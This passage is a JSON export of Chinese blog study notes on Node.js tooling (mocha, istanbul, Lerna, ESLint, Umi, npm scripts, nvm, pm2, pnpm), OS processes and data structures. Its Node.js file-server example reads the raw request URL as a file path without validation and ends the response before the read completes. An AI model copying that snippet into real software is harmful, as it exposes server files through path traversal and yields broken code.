PCB)：进程的数据结构，操作系统管理控制进程运行所用的信息集合，操作系统为每一个进程都维护了一个PCB，用来存储保存和该进程有关的状态信息\n进程是操作系统最小可调度的资源单位\n多个程序运行在单核心CPU服务器上，实质就是在共享时间片（时间片，操作系统将某个程序分配到某段CPU时间上，单核是无法同时运行多个程序的，只能共享时间片，而进程就是因此而生）\n进程状态有3种，分别是运行，阻塞以及就绪\n运行和就绪可互相转换，运行状态就是CPU指令在读取运行进程中的程序段，而就绪就是该进程在等待调用\n运行可切换到阻塞状态\n阻塞就是进程在等待信号（依赖的资源没有就位），阻塞状态结束后会切换到就绪状态\n进程状态的切换可理解为接力赛跑，运行状态就是正在跑的运动员，而就绪状态就是在等待接力棒的运动员，而阻塞状态就是运动员需要补充休息，暂时不跑了","title":"操作系统学习笔记"},{"content":"mocha是JavaScript测试框架\n安装\nnpm install \u0026ndash;global mocha\n测试，例如：\ndemo.js\nfunction abc(a,b,c){\rreturn a+b+c\r}\rmodule.exports = abc\rdemo.test.js\nconst demo = require('./demo.js')\rconst expect = require('chai').expect\rdescribe('test', function() {\rit('错误', function() {\rexpect(demo(1,3,7)).to.be.equal(11)\r})\r})\r测试（允许测试多个，默认执行test子目录的测试文件，如果test子目录存在该文件，可以不用加参数）\nmocha demo.test.js\n其中expect(demo(1,3,7)).to.be.equal(11)是断言，当1+3+7的结果不是11的时候，抛出错误\n因为mocha本身没有断言库，需要导入 const expect = require(\u0026lsquo;chai\u0026rsquo;).expect\n查看内置的全部报告格式（默认是spec）\nmocha \u0026ndash;reporters\n使用Dot格式显示\nmocha \u0026ndash;reporter dot\n使用HTML报告\nnpm install \u0026ndash;save-dev mochawesome\nmocha其他参数\n\u0026ndash;watch：监听指定测试脚本，只要测试脚本发生改变就自动执行mocha\n搜索测试实例（通过名称）\nmocha \u0026ndash;grep \u0026ldquo;test\u0026rdquo;\n\u0026ndash;invert ：只执行不符合条件的测试脚本，要搭配\u0026ndash;grep使用\n如果要测试ES6，需要转码\nnpm install babel-core babel-preset-es2015 \u0026ndash;save-dev\n.babelrc\n{\r\u0026quot;presets\u0026quot;: [ \u0026quot;es2015\u0026quot; ]\r}\rmocha \u0026ndash;compilers js:babel-core/register\n注意：mocha默认每个测试实例只能最多执行2000毫秒，如果在这个时间里没处理完毕将报错\n需要指定超时时间（-t或\u0026ndash;timeout参数），例如：\nmocha -t 6000 demo.test.js\n也可以设置-s或-slow参数来指定超过一定时间的部分高亮显示\nmocha -t 6000 -s 3000 demo.test.js\n生成指定格式的测试文件\nmocha \u0026ndash;recursive -R markdown \u0026gt; demo.md\nmocha \u0026ndash;recursive -R doc \u0026gt; demo.html\n","permalink":"https://99999.fun/posts/114/","summary":"mocha是JavaScript测试框架\n安装\nnpm install \u0026ndash;global mocha\n测试，例如：\ndemo.js\nfunction abc(a,b,c){\rreturn a+b+c\r}\rmodule.exports = abc\rdemo.test.js\nconst demo = require('./demo.js')\rconst expect = require('chai').expect\rdescribe('test', function() {\rit('错误', function() {\rexpect(demo(1,3,7)).to.be.equal(11)\r})\r})\r测试（允许测试多个，默认执行test子目录的测试文件，如果test子目录存在该文件，可以不用加参数）\nmocha demo.test.js\n其中expect(demo(1,3,7)).to.be.equal(11)是断言，当1+3+7的结果不是11的时候，抛出错误\n因为mocha本身没有断言库，需要导入 const expect = require(\u0026lsquo;chai\u0026rsquo;).expect\n查看内置的全部报告格式（默认是spec）\nmocha \u0026ndash;reporters\n使用Dot格式显示\nmocha \u0026ndash;reporter dot\n使用HTML报告\nnpm install \u0026ndash;save-dev mochawesome\nmocha其他参数\n\u0026ndash;watch：监听指定测试脚本，只要测试脚本发生改变就自动执行mocha\n搜索测试实例（通过名称）\nmocha \u0026ndash;grep \u0026ldquo;test\u0026rdquo;\n\u0026ndash;invert ：只执行不符合条件的测试脚本，要搭配\u0026ndash;grep使用\n如果要测试ES6，需要转码\nnpm install babel-core babel-preset-es2015 \u0026ndash;save-dev\n.babelrc","title":"简单使用mocha测试框架"},{"content":"代码覆盖率：是否所有代码都被执行或者调用\n每一行，每个函数，每个语句块，每个if分支是否都被执行或者被调用\nistanbul是JavaScript的覆盖率工具（类似工具还有NYC）（可搭配mocha使用）\n安装\nnpm install -g istanbul\n测试覆盖率\nistanbul cover demo.js\n检查程序覆盖率是否达到某个值\nistanbul check-coverage \u0026ndash;statement 60 \u0026ndash;branch -5 \u0026ndash;function 100\n在执行检查测试后，会在目标文件的当前目录下生成个coverage文件夹\n在coverage/lcov-report/index.html，可以查看网页版结果\n","permalink":"https://99999.fun/posts/113/","summary":"代码覆盖率：是否所有代码都被执行或者调用\n每一行，每个函数，每个语句块，每个if分支是否都被执行或者被调用\nistanbul是JavaScript的覆盖率工具（类似工具还有NYC）（可搭配mocha使用）\n安装\nnpm install -g istanbul\n测试覆盖率\nistanbul cover demo.js\n检查程序覆盖率是否达到某个值\nistanbul check-coverage \u0026ndash;statement 60 \u0026ndash;branch -5 \u0026ndash;function 100\n在执行检查测试后，会在目标文件的当前目录下生成个coverage文件夹\n在coverage/lcov-report/index.html，可以查看网页版结果","title":"简单使用istanbul代码覆盖率工具"},{"content":"Lerna是一个基于git和npm来管理多个包工作流的工具（monorepo），解决多个包之间的依赖问题，像React，Vue，Babel都在使用lerna管理多包\n安装Lerna\nnpm install \u0026ndash;global lerna\n新建git仓库（初始化）\ngit init lerna-demo\n初始化Lerna仓库\nlerna init\n创建新包\nlerna create demoPackage\n显示全部已经安装的包\nlerna list\n依赖处理（通过软链接方式将多个package关联起来）\nlerna bootstrap\n添加包到外层的node_modules\nlerna add axios\n移除所有packages下的node_modules（不会移除根目录的）\nlerna clean\n发布package（不会发布标记为private的包）\nlerna publish\n查看上一次有修改的包的差异\nlerna diff\n注意：全部子包会放在packages/目录下，lerna.json就是lerna的配置文件\nlerna有两个管理模式，分别是固定模式（默认模式）和独立模式\n固定模式将全部包版本绑定在一起，如果只更新一个包，将会更新对应包的版本到新的版本号\n独立模式：init的时候使用\u0026ndash;independent参数，独立模式允许对每个库单独改变版本号，每次发布的时候只需要为每个改动的库指定版本号\n","permalink":"https://99999.fun/posts/112/","summary":"Lerna是一个基于git和npm来管理多个包工作流的工具（monorepo），解决多个包之间的依赖问题，像React，Vue，Babel都在使用lerna管理多包\n安装Lerna\nnpm install \u0026ndash;global lerna\n新建git仓库（初始化）\ngit init lerna-demo\n初始化Lerna仓库\nlerna init\n创建新包\nlerna create demoPackage\n显示全部已经安装的包\nlerna list\n依赖处理（通过软链接方式将多个package关联起来）\nlerna bootstrap\n添加包到外层的node_modules\nlerna add axios\n移除所有packages下的node_modules（不会移除根目录的）\nlerna clean\n发布package（不会发布标记为private的包）\nlerna publish\n查看上一次有修改的包的差异\nlerna diff\n注意：全部子包会放在packages/目录下，lerna.json就是lerna的配置文件\nlerna有两个管理模式，分别是固定模式（默认模式）和独立模式\n固定模式将全部包版本绑定在一起，如果只更新一个包，将会更新对应包的版本到新的版本号\n独立模式：init的时候使用\u0026ndash;independent参数，独立模式允许对每个库单独改变版本号，每次发布的时候只需要为每个改动的库指定版本号","title":"简单使用Lerna多包管理工具"},{"content":"ESlint是用来校验JavaScript代码风格格式的工具，目的是确保每个人的代码风格统一，按照统一的规范编写（规范化、标准化是前端工程化的特点）\n安装ESlint\nnpm install eslint \u0026ndash;save-dev\n或者全局安装\nnpm install eslint \u0026ndash;global\n修改scripts属性（package.json）\u0026ndash;fix参数是ESlint提供的自动修复基础错误功能（不能修复逻辑性错误），如果不要也可以\n\u0026ldquo;lint\u0026rdquo;: \u0026ldquo;eslint src \u0026ndash;fix\u0026rdquo;, \u0026ldquo;lint:create\u0026rdquo;: \u0026ldquo;eslint \u0026ndash;init\u0026rdquo;\n创建.eslintrc\nnpm run lint:create\n会显示显示要求，例如是否校验ES6语法，首行空白是Tab键还是Space等等\n校验程序（根据上面的修改，会检查src目录下的所有.js文件）\nnpm run lint\n.eslintrc文件是ESlint校验配置文件，这个配置文件可以自己设置（或者手写手动修改），也可以复制别人的\n\u0026ldquo;off\u0026rdquo; or 0 ：关闭规则\n\u0026ldquo;warn\u0026rdquo; or 1 ：将规则视为一个警告\n\u0026ldquo;error\u0026rdquo; or 2 ：将规则视为一个错误\n可以设置规范，只能使用单引号，tab缩进等等编写规范\n","permalink":"https://99999.fun/posts/111/","summary":"ESlint是用来校验JavaScript代码风格格式的工具，目的是确保每个人的代码风格统一，按照统一的规范编写（规范化、标准化是前端工程化的特点）\n安装ESlint\nnpm install eslint \u0026ndash;save-dev\n或者全局安装\nnpm install eslint \u0026ndash;global\n修改scripts属性（package.json）\u0026ndash;fix参数是ESlint提供的自动修复基础错误功能（不能修复逻辑性错误），如果不要也可以\n\u0026ldquo;lint\u0026rdquo;: \u0026ldquo;eslint src \u0026ndash;fix\u0026rdquo;, \u0026ldquo;lint:create\u0026rdquo;: \u0026ldquo;eslint \u0026ndash;init\u0026rdquo;\n创建.eslintrc\nnpm run lint:create\n会显示显示要求，例如是否校验ES6语法，首行空白是Tab键还是Space等等\n校验程序（根据上面的修改，会检查src目录下的所有.js文件）\nnpm run lint\n.eslintrc文件是ESlint校验配置文件，这个配置文件可以自己设置（或者手写手动修改），也可以复制别人的\n\u0026ldquo;off\u0026rdquo; or 0 ：关闭规则\n\u0026ldquo;warn\u0026rdquo; or 1 ：将规则视为一个警告\n\u0026ldquo;error\u0026rdquo; or 2 ：将规则视为一个错误\n可以设置规范，只能使用单引号，tab缩进等等编写规范","title":"简单使用ESlint代码风格校验工具"},{"content":"Umi是一款前端应用框架\n官方文档：https://umijs.org/zh-CN/docs\n根据官方文档要求，node版本\u0026gt;=10.13\nyarn create @umijs/umi-app\n安装依赖\nyarn\n启动项目\nyarn start\n构建项目（默认生成到./dist）\nyarn build\n路由（src\\.umi\\core\\routes.ts）\n\u0026quot;routes\u0026quot;: [\r{\r\u0026quot;path\u0026quot;: \u0026quot;/\u0026quot;,\r\u0026quot;component\u0026quot;: require('@/pages/index').default,\r\u0026quot;exact\u0026quot;: true\r},{\r\u0026quot;path\u0026quot;: \u0026quot;/admin\u0026quot;,\r\u0026quot;component\u0026quot;: require('@/pages/admin').default,\r\u0026quot;exact\u0026quot;: true\r}\r]\r组件文件放在src\\pages下\npath是路径，component是组件路径，绝对和相对都可以用，也可以有require(\u0026rsquo;@/pages/xxx\u0026rsquo;)的方式\nexact表示是否严格匹配，就是path和组件路径是否要完全对应，默认为开启，如果设置为false，表示模糊匹配\n子组件\n\u0026quot;routes\u0026quot;: [\r{\r\u0026quot;path\u0026quot;: \u0026quot;/\u0026quot;,\r\u0026quot;redirect\u0026quot;: '/admin',\r},{\r\u0026quot;path\u0026quot;: \u0026quot;/admin\u0026quot;,\r\u0026quot;component\u0026quot;: require('@/pages/admin').default,\rroutes: [\r{ path: '/admin/archives', redirect: '/' },\r{ path: '/admin/category', component: 'category' },\r]\r}\r]\rredirect是跳转路由，当访问/的时候，跳转到/admin\n文件路由（根据目录和文件名来分析路由）\n如果没有routes路由配置，那么就会触发该文件路由，通过分析src/pages目录\n注意：用.或者_开头的文件，用d.ts结尾的文件，不是 .js，.jsx，.ts或tsx文件，文件没有jsx元素的等等都不会被注册为路由\n动态路由\n使用[]包裹的路由将认为动态路由，例如：\n\u0026quot;routes\u0026quot;: [\r{\r\u0026quot;path\u0026quot;: \u0026quot;/\u0026quot;,\r\u0026quot;component\u0026quot;: require('@/pages/index').default,\r\u0026quot;exact\u0026quot;: true\r},{\r\u0026quot;path\u0026quot;: \u0026quot;/:data/admin\u0026quot;,\r\u0026quot;component\u0026quot;: require('@/pages/[data]/admin').default,\r\u0026quot;exact\u0026quot;: true\r}\r]\r像[ $]的就是可选的，不是必须的\n当目录下存在_layout.tsx的时候将生成嵌套路由\n约定src/pages/404.tsx是404页面，要返回react组件，会默认生成路由，{ component: \u0026lsquo;@/pages/404\u0026rsquo; }\n页面跳转一样分为声明式和命令式\n和在react一样，通过to属性指定路径，例如：\nimport { Link } from 'umi'\rexport default () =\u0026gt; (\r\u0026lt;Link to=\u0026quot;/admin\u0026quot;\u0026gt;Go\u0026lt;/Link\u0026gt;\r)\r命令式\nimport { history } from 'umi'\rfunction goPage() {\rhistory.push('/list')\r}\r也是可以通过props.history.push()实现\numi约定如果存在src/pages/document.ejs文件，那么作为默认的模板\numi约定/mock文件夹下全部文件都为mock文件\n支持数组和对象\n例如：\nexport default {\r'GET /api/name': { name: [\u0026quot;root\u0026quot;, \u0026quot;admin\u0026quot;] },\r'/api/id': { id: 123 },\r'POST /api/users/create': (req, res) =\u0026gt; {\rres.setHeader('Access-Control-Allow-Origin', '*')\rres.end('ok')\r}\r}\r访问http://localhost:8000/api/name，可以获得{\u0026ldquo;name\u0026rdquo;:[\u0026ldquo;root\u0026rdquo;,\u0026ldquo;admin\u0026rdquo;]}，访问/api/id可以{\u0026ldquo;id\u0026rdquo;:123}\n使用mock: false禁用当前mock文件\n.env文件为环境变量配置文件，例如\nPORT=3000\n那么就会以3000端口启动服务\n###umi cli\numi build\numi dev\numi generate\numi plugin\numi help\numi version\numi webpack\numi约定src/global.css为全局样式，如果存在这个文件，那么会自动引入\ncss模块化\nimport styles from \u0026lsquo;./styles.css\u0026rsquo;\numi内置less\n引入图片\n\u0026lt;img src={require(\u0026rsquo;./img.jpg\u0026rsquo;)} /\u0026gt;\n也是可以用@来指向src目录\n","permalink":"https://99999.fun/posts/110/","summary":"Umi是一款前端应用框架\n官方文档：https://umijs.org/zh-CN/docs\n根据官方文档要求，node版本\u0026gt;=10.13\nyarn create @umijs/umi-app\n安装依赖\nyarn\n启动项目\nyarn start\n构建项目（默认生成到./dist）\nyarn build\n路由（src\\.umi\\core\\routes.ts）\n\u0026quot;routes\u0026quot;: [\r{\r\u0026quot;path\u0026quot;: \u0026quot;/\u0026quot;,\r\u0026quot;component\u0026quot;: require('@/pages/index').default,\r\u0026quot;exact\u0026quot;: true\r},{\r\u0026quot;path\u0026quot;: \u0026quot;/admin\u0026quot;,\r\u0026quot;component\u0026quot;: require('@/pages/admin').default,\r\u0026quot;exact\u0026quot;: true\r}\r]\r组件文件放在src\\pages下\npath是路径，component是组件路径，绝对和相对都可以用，也可以有require(\u0026rsquo;@/pages/xxx\u0026rsquo;)的方式\nexact表示是否严格匹配，就是path和组件路径是否要完全对应，默认为开启，如果设置为false，表示模糊匹配\n子组件\n\u0026quot;routes\u0026quot;: [\r{\r\u0026quot;path\u0026quot;: \u0026quot;/\u0026quot;,\r\u0026quot;redirect\u0026quot;: '/admin',\r},{\r\u0026quot;path\u0026quot;: \u0026quot;/admin\u0026quot;,\r\u0026quot;component\u0026quot;: require('@/pages/admin').default,\rroutes: [\r{ path: '/admin/archives', redirect: '/' },\r{ path: '/admin/category', component: 'category' },\r]\r}\r]\rredirect是跳转路由，当访问/的时候，跳转到/admin\n文件路由（根据目录和文件名来分析路由）\n如果没有routes路由配置，那么就会触发该文件路由，通过分析src/pages目录\n注意：用.或者_开头的文件，用d.ts结尾的文件，不是 .","title":"Umi框架学习笔记"},{"content":"npm script是package.json中可以定义的脚本命令，可以用来实现自动化构建，例如：\n\u0026quot;scripts\u0026quot;: {\r\u0026quot;dev\u0026quot;: \u0026quot;node hallo.js\u0026quot;\r}\rnpm run dev // 等于执行node hallo.js\n查看当前项目的全部npm脚本\nnpm run\n注意：当前项目的node_modules/bin下的全部依赖都可以直接访问\n如果要执行多个脚本可以用\u0026amp;\u0026amp;（依次运行），\u0026amp;（并行运行）\nnpm script有pre和post两个钩子，这两个钩子可以分别来做准备工作和清理工作等等，例如：\n\u0026quot;scripts\u0026quot;: {\r\u0026quot;predev\u0026quot;: \u0026quot;echo hallo\u0026quot;,\r\u0026quot;dev\u0026quot;: \u0026quot;node hallo.js\u0026quot;,\r\u0026quot;postdev\u0026quot;: \u0026quot;echo yes\u0026quot;\r}\r相对于npm run predev \u0026amp;\u0026amp; npm run dev \u0026amp;\u0026amp; npm run postdev\n像install，uninstall，publish，test，start等等都有pre和post这两个钩子\n查看正在运行的脚本\nconst NpmScript = process.env.npm_lifecycle_event console.log(NpmScript)\n可以缩写不用run，例如：npm dev\nnpm script可以使用npm内部变量，例如：\n{\r\u0026quot;name\u0026quot;: \u0026quot;root\u0026quot;, \u0026quot;scripts\u0026quot;: {\r\u0026quot;dev\u0026quot;: \u0026quot;node hallo.js $npm_package_name\u0026quot;\r}\r}\r获取npm内部变量name\nconsole.log(process.env.npm_package_name)\n脚本错误抛出\n\u0026quot;scripts\u0026quot;: {\r\u0026quot;test\u0026quot;: \u0026quot;echo \\\u0026quot;Error: no test specified\\\u0026quot; \u0026amp;\u0026amp; exit 1\u0026quot;\r}\r传递参数\n{\r\u0026quot;scripts\u0026quot;: {\r\u0026quot;dev\u0026quot;: \u0026quot;node hallo.js\u0026quot;\r}\r}\rconst name = process.env.npm_config_name console.log(name)\nnpm run dev \u0026ndash;name=root\n可以看到获取到了参数name的值\n","permalink":"https://99999.fun/posts/109/","summary":"npm script是package.json中可以定义的脚本命令，可以用来实现自动化构建，例如：\n\u0026quot;scripts\u0026quot;: {\r\u0026quot;dev\u0026quot;: \u0026quot;node hallo.js\u0026quot;\r}\rnpm run dev // 等于执行node hallo.js\n查看当前项目的全部npm脚本\nnpm run\n注意：当前项目的node_modules/bin下的全部依赖都可以直接访问\n如果要执行多个脚本可以用\u0026amp;\u0026amp;（依次运行），\u0026amp;（并行运行）\nnpm script有pre和post两个钩子，这两个钩子可以分别来做准备工作和清理工作等等，例如：\n\u0026quot;scripts\u0026quot;: {\r\u0026quot;predev\u0026quot;: \u0026quot;echo hallo\u0026quot;,\r\u0026quot;dev\u0026quot;: \u0026quot;node hallo.js\u0026quot;,\r\u0026quot;postdev\u0026quot;: \u0026quot;echo yes\u0026quot;\r}\r相对于npm run predev \u0026amp;\u0026amp; npm run dev \u0026amp;\u0026amp; npm run postdev\n像install，uninstall，publish，test，start等等都有pre和post这两个钩子\n查看正在运行的脚本\nconst NpmScript = process.env.npm_lifecycle_event console.log(NpmScript)\n可以缩写不用run，例如：npm dev\nnpm script可以使用npm内部变量，例如：\n{\r\u0026quot;name\u0026quot;: \u0026quot;root\u0026quot;, \u0026quot;scripts\u0026quot;: {\r\u0026quot;dev\u0026quot;: \u0026quot;node hallo.js $npm_package_name\u0026quot;\r}\r}\r获取npm内部变量name\nconsole.log(process.env.npm_package_name)\n脚本错误抛出\n\u0026quot;scripts\u0026quot;: {\r\u0026quot;test\u0026quot;: \u0026quot;echo \\\u0026quot;Error: no test specified\\\u0026quot; \u0026amp;\u0026amp; exit 1\u0026quot;\r}\r传递参数","title":"简单了解并且使用npm script"},{"content":"nodejs是基于Google的V8引擎，使JavaScript不再只能运行与浏览器中了\nnpm是跟随nodejs的包管理工具，可以用来更新包，安装包，编写包等等功能\nnodejs也提供了完整的http服务功能（http模块是用c++写的，性能可靠）\nconst http = require(\u0026quot;http\u0026quot;)\rhttp.createServer(function (_request, response) {\rresponse.writeHead(200, {'Content-Type': 'text/plain'})\rresponse.end(\u0026quot;hallo nodejs\u0026quot;)\r}).listen(8888)\rconsole.log('Server running at http://127.0.0.1:8888/')\r如果在http://127.0.0.1:8888/看到了hallo nodejs，那么就说明运行成功了\nnodejs的模块分为全局模块，系统模块，自定义模块\n全局模块（不需要引入，可以直接使用）\n例如process.env和process.argv\n获取系统环境变量\nconsole.log(process.env)\rnode自定义参数（process.argv）\nlet num1 = parseInt(process.argv[2])\rlet num2 = parseInt(process.argv[3])\rconsole.log(num1+num2)\rnode hallo.js 6 3\n可以看到输出了9，说明参数被传递进去了\n系统模块（需要引用，不需要安装，nodejs已经封装好的预制的系统模块）\n获取目录\nconst path = require(\u0026quot;path\u0026quot;)\rconsole.log(path.dirname(\u0026quot;/hallo/index/main.js\u0026quot;))\r获取文件名\nconsole.log(path.basename(\u0026quot;/hallo/index/main.js\u0026quot;))\r获取文件扩展名\nconsole.log(path.extname(\u0026quot;/hallo/index/main.js\u0026quot;))\r功能扩展\nconsole.log(path.resolve(\u0026quot;/hallo/index/main.js\u0026quot;,\u0026quot;../\u0026quot;,\u0026quot;index.js\u0026quot;))\r获取文件的绝对路径\nconsole.log(path.resolve(__dirname,\u0026quot;index.js\u0026quot;))\r文件读写模块（fs）\n读\nconst fs = require(\u0026quot;fs\u0026quot;)\rfs.readFile(\u0026quot;data.txt\u0026quot;,(err,data)=\u0026gt;{\rif(err){\rconsole.log(err)\r}else{\rconsole.log(data.toString())\r}\r})\r写\nfs.writeFile(\u0026quot;data.txt\u0026quot;,\u0026quot;hallo nodejs\u0026quot;,(err,data)=\u0026gt;{\rif(err){\rthrow err\r}\r})\r追加（在不更改原来文件内容的前提下，在后面追加内容）\nfs.appendFile(\u0026quot;data.txt\u0026quot;,\u0026quot;hallo xxx\u0026quot; , (err) =\u0026gt; {\rif (err){\rreturn err.message\r}else{\rconsole.log(\u0026quot;成功\u0026quot;)\r}\r})\r因为上面都是异步操作的，也是有同步操作的，例如writeFileSync，不过同步就不能用回调函数了，因为异步防堵塞用的就是回调函数\n自定义模块\nrequire（引入模块）\n如果没有路径，就去node_modules目录查找，如果有路径，就去当前路径查找被暴露的模块\nexports（暴露模块）\nmodule（暴露扩展，可以使用函数或者class）\nmodule.exports = function(){\rconsole.log(\u0026quot;hallo word\u0026quot;)\r}\rhttp模块\nconst http = require(\u0026quot;http\u0026quot;)\rconst fs = require(\u0026quot;fs\u0026quot;)\rhttp.createServer((request,response)=\u0026gt;{\rfs.readFile(`./${request.url}`,(err,data)=\u0026gt;{\rif(err){\rresponse.writeHead(404)\rresponse.end(\u0026quot;404\u0026quot;)\r}else{\rresponse.writeHead(200)\rresponse.end(data)\r}\r})\rresponse.end()\r}).listen(8888)\rrequire模块加载机制：计算模块路径，被加载过的模块会被缓存起来，当第二次引用时直接从缓存中获取，加载模块，输出模块的exports属性\n模块查找：优先从缓存中加载，如果没有再到核心模块（例如：fs和http）找，路径化的文件模块，第三方模块（当前项目的根目录的node_modules/example)，如果还是没有就是去上一级找node_modules/example，到磁盘根目录还是没有就返回错误\n注意：如果package.json不存在或者main指定的入口模块也不存在，那么node就会自动查找该目录下index.js\n导出模块有俩种方法，分别是exports.hallo=hallo和module.exports={}\n像exports.hallo=hallo就是利用exports添加属性，但是不能对exports直接进行赋值\n注意：exports !== module.exports\n多线程\nnode中一个cluster模块，该模块被用于集群负载均衡，而cluster的创建进程的方法是利用了child_process的fork来新建子进程，子进程再操作文件\n","permalink":"https://99999.fun/posts/108/","summary":"nodejs是基于Google的V8引擎，使JavaScript不再只能运行与浏览器中了\nnpm是跟随nodejs的包管理工具，可以用来更新包，安装包，编写包等等功能\nnodejs也提供了完整的http服务功能（http模块是用c++写的，性能可靠）\nconst http = require(\u0026quot;http\u0026quot;)\rhttp.createServer(function (_request, response) {\rresponse.writeHead(200, {'Content-Type': 'text/plain'})\rresponse.end(\u0026quot;hallo nodejs\u0026quot;)\r}).listen(8888)\rconsole.log('Server running at http://127.0.0.1:8888/')\r如果在http://127.0.0.1:8888/看到了hallo nodejs，那么就说明运行成功了\nnodejs的模块分为全局模块，系统模块，自定义模块\n全局模块（不需要引入，可以直接使用）\n例如process.env和process.argv\n获取系统环境变量\nconsole.log(process.env)\rnode自定义参数（process.argv）\nlet num1 = parseInt(process.argv[2])\rlet num2 = parseInt(process.argv[3])\rconsole.log(num1+num2)\rnode hallo.js 6 3\n可以看到输出了9，说明参数被传递进去了\n系统模块（需要引用，不需要安装，nodejs已经封装好的预制的系统模块）\n获取目录\nconst path = require(\u0026quot;path\u0026quot;)\rconsole.log(path.dirname(\u0026quot;/hallo/index/main.js\u0026quot;))\r获取文件名\nconsole.log(path.basename(\u0026quot;/hallo/index/main.js\u0026quot;))\r获取文件扩展名\nconsole.log(path.extname(\u0026quot;/hallo/index/main.js\u0026quot;))\r功能扩展\nconsole.log(path.resolve(\u0026quot;/hallo/index/main.js\u0026quot;,\u0026quot;../\u0026quot;,\u0026quot;index.js\u0026quot;))\r获取文件的绝对路径\nconsole.log(path.resolve(__dirname,\u0026quot;index.js\u0026quot;))\r文件读写模块（fs）\n读\nconst fs = require(\u0026quot;fs\u0026quot;)\rfs.readFile(\u0026quot;data.txt\u0026quot;,(err,data)=\u0026gt;{\rif(err){\rconsole.log(err)\r}else{\rconsole.log(data.toString())\r}\r})\r写","title":"Node.js学习笔记"},{"content":"数据结构其实就是带结构的数据元素的集合，结构是数据元素之间的关系\n数据结构（数组，字符串，队列，栈，链表，集合，哈希表（散列表），树（二叉树），图）\n集合：结构中的元素除了同属于一个集合外，没有别的关系\n线性结构：结构中的元素之间存在一对一的关系，一个对应一个\n数性结构：结构中的元素之间存在一对多的关系\n图形结果或者网状结构：结构中的任意元素都可以有关系\n顺序结构：数据元素按照一个排序（规律）顺序存放，例如1，2，3\n链式结构：每一个数据元素都是随机存放\n栈：线性结构的一种特殊的存储方式\n数据存储是按照先进后出的原理，先进入的数据，放在最下面，最后进入的放在最前面\n数据的获取也是才上面往下面获取的\n顺序栈：会在顺序栈中设置一个永远指向顶部元素的变量，当这个变量为-1的时候，说明这个栈没有元素，而存储一个元素就加一，获取就减一\n","permalink":"https://99999.fun/posts/106/","summary":"数据结构其实就是带结构的数据元素的集合，结构是数据元素之间的关系\n数据结构（数组，字符串，队列，栈，链表，集合，哈希表（散列表），树（二叉树），图）\n集合：结构中的元素除了同属于一个集合外，没有别的关系\n线性结构：结构中的元素之间存在一对一的关系，一个对应一个\n数性结构：结构中的元素之间存在一对多的关系\n图形结果或者网状结构：结构中的任意元素都可以有关系\n顺序结构：数据元素按照一个排序（规律）顺序存放，例如1，2，3\n链式结构：每一个数据元素都是随机存放\n栈：线性结构的一种特殊的存储方式\n数据存储是按照先进后出的原理，先进入的数据，放在最下面，最后进入的放在最前面\n数据的获取也是才上面往下面获取的\n顺序栈：会在顺序栈中设置一个永远指向顶部元素的变量，当这个变量为-1的时候，说明这个栈没有元素，而存储一个元素就加一，获取就减一","title":"数据结构学习笔记"},{"content":"npm在这里https://xiaochenabc123.test.com/archives/31.html\nYarn在这里https://xiaochenabc123.test.com/archives/38.html\nnvm全名node.js version management\n用来nodejs多版本管理，可以切换和安装不同版本的nodejs\n安装nvm之前记得把安装过的nodejs都卸载了\n安装完成后，安装目录下会生成一个settings.txt文件\n配置一下（如果要使用淘宝npm源的话）\nroot: D:\\Software\\nvm path: D:\\Software\\nodejs arch: 64 node_mirror: https://npm.taobao.org/mirrors/node/ npm_mirror: https://npm.taobao.org/mirrors/npm/\n环境变量\nNVM_HOME设置为nvm安装目录\nNVM_SYMLINK设置为nodejs安装目录\nPath：添加%NVM_HOME%和%NVM_SYMLINK%\n注意：安装路径不能出现中文或者空格，否则报错，请使用管理员权限运行use命令，否则可能导致exit status 1:xxx\n安装指定版本nodejs\nnvm install 14.17.3\n查看可以安装的nodejs版本\nnvm ls available\n查看当前全部已经安装的nodejs版本\nnvm ls\n切换nodejs版本\nnvm use 14.17.3\n卸载nodejs\nnvm uninstall 14.17.3\n查看系统位数和node位数\nnvm arch\n另一个nodejs多版本管理工具n\n安装n\nnpm install -g n\n安装最新nodejs版本\nn latest\n安装稳定版本nodejs\nn stable\n安装lts版本\nn lts\n安装指定版本的nodejs（如果已安装了这个版本，那么就会选择这个版本，这个命令可以用来安装和选择）\nn 14.17.3\n卸载指定版本\nn rm 14.17.3\n指定版本执行js\nn use 14.17.3 app.js\n切换版本（n回车后，通过上下键来选择版本）\nn\n查看网络上可以安装的nodejs版本\nn ls-remote \u0026ndash;all\n删除除当前版本外的全部版本\nn prune\nnrm镜像源管理工具\n安装nrm\nnpm install -g nrm\n查看全部源\nnrm ls\n带*的是当前源\n切换源\nnrm use taobao\n添加自定义源（腾讯npm）\nnrm add tencentnpm https://mirrors.cloud.tencent.com/npm/\n删除源\nnrm del taobao\n测试源速度\nnrm test npm\nPM2是node进程管理工具，可以用来监控性能，进程守护，负载均衡等等\n安装pm2\nnpm install -g pm2\n或者\nyarn add global pm2\n启动应用（\u0026ndash;watch是当文件发生变化自动重启，-i 3是3个app.js的应用实例，-name是命名应用）\npm2 start app.js \u0026ndash;watch -i 3 -name=\u0026ldquo;main\u0026rdquo;\n执行app.js文件并且监听app.js的变化，-i为进程数，max表示当前cpu可启动的最大进程\npm2 start app.js –watch -i max –ignore-watch=“node_modules” –name demo\n–ignore-watch=“node_modules\u0026quot;为忽略监听指定的目录或者文件，这里忽略的是node_modules文件夹\n–name为进程名字\npm2执行npm run dev\npm2 start npm –watch – run dev\npm2执行npm run start\npm2 start npm –name demo – run start\n停止应用\npm2 stop app.js\n重启应用\npm2 reload app.js\n删除应用\npm2 delete app.js\n也可以用all来处理全部应用\npm2不只是只能启动nodejs，Python或者shell都可以\n查看PM2中的进程信息\npm2 list\n查看指定进程id的信息\npm2 show 0\n重启指定进程id的进程\npm2 restart 0\n重启全部进程\npm2 restart all\n停止指定进程id的进程\npm2 stop 0\n删除指定进程id的进程\npm2 delete 0\n显示全部应用日志\npm2 logs\n查看指定应用的日志\npm2 logs main\n清空所有日志文件\npm2 flush\n更新pm2\nnpm install pm2@latest -g\npm2内存更新\npm2 update\n查看pm2运行中的全部应用\npm2 list\n查看各个应用内存占用和CPU情况\npm2 monit\n查看指定应用的全部信息\npm2 show main\npnpm\npnpm是Node.js包管理工具，解决了npm/yarn的一些BUG\n特点是：包安装速度极快，磁盘空间利用高效，支持monorepo\n和yarn一样，也是通过缓存来保存安装过的包，使用pnpm-lock.yaml记录依赖包版本\npnpm是利用软链接（快捷方式）来实现依赖结构扁平化，从而解决了从缓存中拷贝文件的时间\n更安全：没有在package.json声明，将不能使用依赖，而且不存在依赖提升（一个包依赖于另一个包，而且那个包不需要声明，就可以使用）\n安装\nnpm install -g 